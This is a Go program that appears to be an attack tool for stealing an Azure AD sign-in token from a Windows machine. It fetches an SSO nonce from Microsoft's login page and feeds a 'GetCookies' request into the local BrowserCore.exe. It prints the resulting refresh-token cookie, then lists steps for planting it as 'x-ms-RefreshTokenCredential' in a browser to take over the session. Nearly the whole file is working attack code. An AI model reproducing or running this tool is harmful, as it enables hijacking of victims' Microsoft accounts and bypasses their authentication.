package main

import (
	"fmt"
	"os"
	"log"
	"os/exec"
	"encoding/binary"
	"io/ioutil"
	"github.com/google/uuid"
	"net/http"
	"strings"
	"encoding/json"
	"errors"
)


type Sso struct {
	FShowPersistentCookiesWarning         bool     `json:"fShowPersistentCookiesWarning"`
	URLMsaLogout                          string   `json:"urlMsaLogout"`
	URLOtherIdpForget                     string   `json:"urlOtherIdpForget"`
	ShowCantAccessAccountLink             bool     `json:"showCantAccessAccountLink"`
	URLGitHubFed                          string   `json:"urlGitHubFed"`
	FShowSignInWithGitHubOnlyOnCredPicker bool     `json:"fShowSignInWithGitHubOnlyOnCredPicker"`
	FEnableShowResendCode                 bool     `json:"fEnableShowResendCode"`
	IShowResendCodeDelay                  int      `json:"iShowResendCodeDelay"`
	SSMSCtryPhoneData                     string   `json:"sSMSCtryPhoneData"`
	FUseInlinePhoneNumber                 bool     `json:"fUseInlinePhoneNumber"`
	FDetectBrowserCapabilities            bool     `json:"fDetectBrowserCapabilities"`
	URLSessionState                       string   `json:"urlSessionState"`
	URLResetPassword                      string   `json:"urlResetPassword"`
	URLMsaResetPassword                   string   `json:"urlMsaResetPassword"`
	URLSignUp                             string   `json:"urlSignUp"`
	URLGetCredentialType                  string   `json:"urlGetCredentialType"`
	URLGetOneTimeCode                     string   `json:"urlGetOneTimeCode"`
	URLLogout                             string   `json:"urlLogout"`
	URLForget                             string   `json:"urlForget"`
	URLDisambigRename                     string   `json:"urlDisambigRename"`
	URLGoToAADError                       string   `json:"urlGoToAADError"`
	URLPIAEndAuth                         string   `json:"urlPIAEndAuth"`
	FCBShowSignUp                         bool     `json:"fCBShowSignUp"`
	FKMSIEnabled                          bool     `json:"fKMSIEnabled"`
	ILoginMode                            int      `json:"iLoginMode"`
	FAllowPhoneSignIn                     bool     `json:"fAllowPhoneSignIn"`
	FAllowPhoneInput                      bool     `json:"fAllowPhoneInput"`
	FAllowSkypeNameLogin                  bool     `json:"fAllowSkypeNameLogin"`
	IMaxPollErrors                        int      `json:"iMaxPollErrors"`
	IPollingTimeout                       int      `json:"iPollingTimeout"`
	SrsSuccess                            bool     `json:"srsSuccess"`
	FShowSwitchUser                       bool     `json:"fShowSwitchUser"`
	ArrValErrs                            []string `json:"arrValErrs"`
	SErrorCode                            string   `json:"sErrorCode"`
	SErrTxt                               string   `json:"sErrTxt"`
	SResetPasswordPrefillParam            string   `json:"sResetPasswordPrefillParam"`
	OnPremPasswordValidationConfig        struct {
		IsUserRealmPrecheckEnabled bool `json:"isUserRealmPrecheckEnabled"`
	} `json:"onPremPasswordValidationConfig"`
	FSwitchDisambig                     bool        `json:"fSwitchDisambig"`
	IRemoteNgcPollingType               int         `json:"iRemoteNgcPollingType"`
	FUseNewNoPasswordTypes              bool        `json:"fUseNewNoPasswordTypes"`
	FAccessPassSupported                bool        `json:"fAccessPassSupported"`
	URLAadSignup                        string      `json:"urlAadSignup"`
	Uiflavor                            int         `json:"uiflavor"`
	IMaxStackForKnockoutAsyncComponents int         `json:"iMaxStackForKnockoutAsyncComponents"`
	FShowButtons                        bool        `json:"fShowButtons"`
	FIsHosted                           bool        `json:"fIsHosted"`
	URLCdn                              string      `json:"urlCdn"`
	URLPost                             string      `json:"urlPost"`
	URLRefresh                          string      `json:"urlRefresh"`
	URLCancel                           string      `json:"urlCancel"`
	URLResume                           string      `json:"urlResume"`
	URLHostedPrivacyLink                string      `json:"urlHostedPrivacyLink"`
	URLHostedTOULink                    string      `json:"urlHostedTOULink"`
	IPawnIcon                           int         `json:"iPawnIcon"`
	IPollingInterval                    int         `json:"iPollingInterval"`
	SPOSTUsername                       string      `json:"sPOST_Username"`
	SFT                                 string      `json:"sFT"`
	SFTName                             string      `json:"sFTName"`
	SFTCookieName                       string      `json:"sFTCookieName"`
	SSessionIdentifierName              string      `json:"sSessionIdentifierName"`
	SCtx                                string      `json:"sCtx"`
	IProductIcon                        int         `json:"iProductIcon"`
	StaticTenantBranding                interface{} `json:"staticTenantBranding"`
	OAppCobranding                      struct {
	} `json:"oAppCobranding"`
	IBackgroundImage                      int           `json:"iBackgroundImage"`
	ArrSessions                           []interface{} `json:"arrSessions"`
	FApplicationInsightsEnabled           bool          `json:"fApplicationInsightsEnabled"`
	IApplicationInsightsEnabledPercentage int           `json:"iApplicationInsightsEnabledPercentage"`
	URLSetDebugMode                       string        `json:"urlSetDebugMode"`
	FEnableCSSAnimation                   bool          `json:"fEnableCssAnimation"`
	FAllowGrayOutLightBox                 bool          `json:"fAllowGrayOutLightBox"`
	FIsRemoteNGCSupported                 bool          `json:"fIsRemoteNGCSupported"`
	DesktopSsoConfig                      struct {
		IsEdgeAnaheimAllowed      bool   `json:"isEdgeAnaheimAllowed"`
		IwaEndpointURLFormat      string `json:"iwaEndpointUrlFormat"`
		IwaSsoProbeURLFormat      string `json:"iwaSsoProbeUrlFormat"`
		IwaIFrameURLFormat        string `json:"iwaIFrameUrlFormat"`
		IwaRequestTimeoutInMs     int    `json:"iwaRequestTimeoutInMs"`
		StartDesktopSsoOnPageLoad bool   `json:"startDesktopSsoOnPageLoad"`
		ProgressAnimationTimeout  int    `json:"progressAnimationTimeout"`
		IsEdgeAllowed             bool   `json:"isEdgeAllowed"`
		MinDssoEdgeVersion        string `json:"minDssoEdgeVersion"`
		IsSafariAllowed           bool   `json:"isSafariAllowed"`
		RedirectURI               string `json:"redirectUri"`
		IsIEAllowedForSsoProbe    bool   `json:"isIEAllowedForSsoProbe"`
		EdgeRedirectURI           string `json:"edgeRedirectUri"`
	} `json:"desktopSsoConfig"`
	URLLogin                      string `json:"urlLogin"`
	URLDssoStatus                 string `json:"urlDssoStatus"`
	ISessionPullType              int    `json:"iSessionPullType"`
	FUseSameSite                  bool   `json:"fUseSameSite"`
	IAllowedIdentities            int    `json:"iAllowedIdentities"`
	IsGlobalTenant                bool   `json:"isGlobalTenant"`
	FUseNewDefaultBackgroundImage bool   `json:"fUseNewDefaultBackgroundImage"`
	Scid                          int    `json:"scid"`
	Hpgact                        int    `json:"hpgact"`
	Hpgid                         int    `json:"hpgid"`
	Pgid                          string `json:"pgid"`
	APICanary                     string `json:"apiCanary"`
	Canary                        string `json:"canary"`
	CorrelationID                 string `json:"correlationId"`
	SessionID                     string `json:"sessionId"`
	Locale                        struct {
		Mkt  string `json:"mkt"`
		Lcid int    `json:"lcid"`
	} `json:"locale"`
	SlMaxRetry      int  `json:"slMaxRetry"`
	SlReportFailure bool `json:"slReportFailure"`
	Strings         struct {
		Desktopsso struct {
			Authenticatingmessage string `json:"authenticatingmessage"`
		} `json:"desktopsso"`
	} `json:"strings"`
	Enums struct {
		ClientMetricsModes struct {
			None             int `json:"None"`
			SubmitOnPost     int `json:"SubmitOnPost"`
			SubmitOnRedirect int `json:"SubmitOnRedirect"`
			InstrumentPlt    int `json:"InstrumentPlt"`
		} `json:"ClientMetricsModes"`
	} `json:"enums"`
	Urls struct {
		Instr struct {
			Pageload   string `json:"pageload"`
			Dssostatus string `json:"dssostatus"`
		} `json:"instr"`
	} `json:"urls"`
	Browser struct {
		Ltr       int `json:"ltr"`
		IE        int `json:"IE"`
		Win       int `json:"_Win"`
		M11       int `json:"_M11"`
		D0        int `json:"_D0"`
		Full      int `json:"Full"`
		Win81     int `json:"Win81"`
		RETrident int `json:"RE_Trident"`
		B         struct {
			Name  string `json:"name"`
			Major int    `json:"major"`
			Minor int    `json:"minor"`
		} `json:"b"`
		Os struct {
			Name    string `json:"name"`
			Version string `json:"version"`
		} `json:"os"`
		V string `json:"V"`
	} `json:"browser"`
	Watson struct {
		URL              string   `json:"url"`
		Bundle           string   `json:"bundle"`
		Sbundle          string   `json:"sbundle"`
		Fbundle          string   `json:"fbundle"`
		ResetErrorPeriod int      `json:"resetErrorPeriod"`
		MaxCorsErrors    int      `json:"maxCorsErrors"`
		MaxInjectErrors  int      `json:"maxInjectErrors"`
		MaxErrors        int      `json:"maxErrors"`
		MaxTotalErrors   int      `json:"maxTotalErrors"`
		ExpSrcs          []string `json:"expSrcs"`
		EnvErrorRedirect bool     `json:"envErrorRedirect"`
		EnvErrorURL      string   `json:"envErrorUrl"`
	} `json:"watson"`
	Loader struct {
		CdnRoots      []string `json:"cdnRoots"`
		LogByThrowing bool     `json:"logByThrowing"`
	} `json:"loader"`
	ServerDetails struct {
		Slc string `json:"slc"`
		Dc  string `json:"dc"`
		Ri  string `json:"ri"`
		Ver struct {
			V []int `json:"v"`
		} `json:"ver"`
		Rt string `json:"rt"`
		Et int    `json:"et"`
	} `json:"serverDetails"`
	Country                     string `json:"country"`
	FBreakBrandingSigninString  bool   `json:"fBreakBrandingSigninString"`
	FFixIncorrectAPICanaryUsage bool   `json:"fFixIncorrectApiCanaryUsage"`
	Bsso                        struct {
		InitiatePullTimeoutMs     int    `json:"initiatePullTimeoutMs"`
		InitiatePullTimeoutAction string `json:"initiatePullTimeoutAction"`
		Rid                       string `json:"rid"`
		States                    struct {
			START      string `json:"START"`
			INPROGRESS string `json:"INPROGRESS"`
			END        string `json:"END"`
			ENDSSO     string `json:"END_SSO"`
			ENDUSERS   string `json:"END_USERS"`
		} `json:"states"`
		Nonce            string `json:"nonce"`
		OverallTimeoutMs int    `json:"overallTimeoutMs"`
		Telemetry        struct {
			Type         string   `json:"type"`
			Nonce        string   `json:"nonce"`
			ReportStates []string `json:"reportStates"`
		} `json:"telemetry"`
		RedirectEndStates []string `json:"redirectEndStates"`
		CookieNames       struct {
			AadSso    string `json:"aadSso"`
			WinSso    string `json:"winSso"`
			SsoTiles  string `json:"ssoTiles"`
			SsoPulled string `json:"ssoPulled"`
			UserList  string `json:"userList"`
		} `json:"cookieNames"`
		Enabled bool   `json:"enabled"`
		Type    string `json:"type"`
		Reason  string `json:"reason"`
	} `json:"bsso"`
	URLNoCookies              string `json:"urlNoCookies"`
	FTrimChromeBssoURL        bool   `json:"fTrimChromeBssoUrl"`
	InlineMode                int    `json:"inlineMode"`
	FShowCopyDebugDetailsLink bool   `json:"fShowCopyDebugDetailsLink"`
}



func checkFiles() (string,bool) {
	filelocs :=[]string{"C:\\Program Files\\Windows Security\\BrowserCore\\browsercore.exe","C:\\Windows\\BrowserCore\\browsercore.exe"}
	for x := range filelocs{
		if _,err := os.Stat(filelocs[x]); os.IsNotExist(err){
			//doesnt exist
			continue
		}
		if _,err := os.Stat(filelocs[x]); !os.IsNotExist(err){
			//exists
			return filelocs[x],true
		}
	}
	return "error",false
}

func parseData(responseBody string) (string,error) {
	splits := strings.Split(responseBody,`<script type="text/javascript">//<![CDATA[`)[1]
	splits2 := strings.Split(splits,`//]]></script>`)[0]
	splits3 := strings.TrimSpace(strings.Split(splits2,`$Config=`)[1])
	jsonString := strings.TrimSuffix(splits3,";")
	var nonceData Sso
	json.Unmarshal([]byte(jsonString),&nonceData)
	if nonceData.Bsso.Nonce == "" {
		return "",errors.New("[!] Failed To Get Nonce..Yeah Just Call It A Day It Aint Workin")
	}
	return nonceData.Bsso.Nonce,nil
}

func getNonce() string {
	fmt.Println("[+] Getting Nonce...")
	client := &http.Client{}
	req,err := http.NewRequest("GET","https://login.microsoftonline.com/Common/oauth2/authorize",nil)
	if err != nil {
		log.Fatal(err)
	}
	req.Header.Set("User-Agent","Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)")
	req.Header.Set("UA-CPU","AMD64")
	q := req.URL.Query()
	mscrid := uuid.New().String()
	clientRequestId := uuid.New().String()
	q.Add("resource","https://graph.windows.net/")
	q.Add("client_id","1b730954-1685-4b74-9bfd-dac224a7b894")
	q.Add("response_type","code")
	q.Add("haschrome","1")
	q.Add("redirect_uri","urn:ietf:wg:oauth:2.0:oob")
	q.Add("client-request-id",clientRequestId)
	q.Add("x-client-SKU","PCL.Desktop")
	q.Add("x-client-Ver","3.19.7.16602")
	q.Add("x-client-CPU","x64")
	q.Add("x-client-OS","Microsoft Windows NT 10.0.19569.0")
	q.Add("site_id","501358")
	q.Add("mscrid",mscrid)
	req.URL.RawQuery = q.Encode()
	resp, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200{
		log.Fatal("Didnt Get a 200 status code!")
	}
	resp_body, _ := ioutil.ReadAll(resp.Body)
	nonce,err := parseData(string(resp_body))
	if err != nil {

		log.Fatal(err)
	}
	fmt.Println("[+] Successfully Acquired Nonce!")
	fmt.Printf("[+] Nonce: %s\n",nonce)
	return nonce
}


func main(){
	// Get Nonce
	nonce := getNonce()
	targetFile,errorBool := checkFiles()
	if errorBool == false{
		log.Fatal("[!] BrowserCore.exe File not Found!")
	}
	fmt.Printf("[+] Found BrowserCore.exe File! => %s\n",targetFile)
	//continue here
	browserCmd := exec.Command(targetFile)
	browserCmdIn ,_ := browserCmd.StdinPipe()
	browserCmdOut ,_ := browserCmd.StdoutPipe()
	browserCmd.Start()
	stuff := fmt.Sprintf("{\"method\":\"GetCookies\",\"uri\":\"https://login.microsoftonline.com/common/oauth2/authorize?sso_nonce=%s\",\"sender\":\"https://login.microsoftonline.com\"}",nonce)
	fmt.Println("[+] Sending json to process stdin => ",stuff)
	stuffLen := len(stuff)
	b := make([]byte, 4)
	binary.PutVarint(b, int64(stuffLen))
	browserCmdIn.Write(b)
	browserCmdIn.Write([]byte(stuff))
	browserCmdIn.Close()
	browserCmdBytes,_ := ioutil.ReadAll(browserCmdOut)
	browserCmd.Wait()
	fmt.Printf("\n[+] Success <(^.^ <)\n")
	fmt.Printf("%s\n",string(browserCmdBytes))
	fmt.Println("[1] Go To This URI https://login.microsoftonline.com/login.srf")
	fmt.Println("[2] Clear All Cookies")
	fmt.Println("[3] Add Cookie Named 'x-ms-RefreshTokenCredential'")
	fmt.Println("[4] Copy everything in data field and put that in the cookie value")
	fmt.Println("[5] Refresh page :D")
}
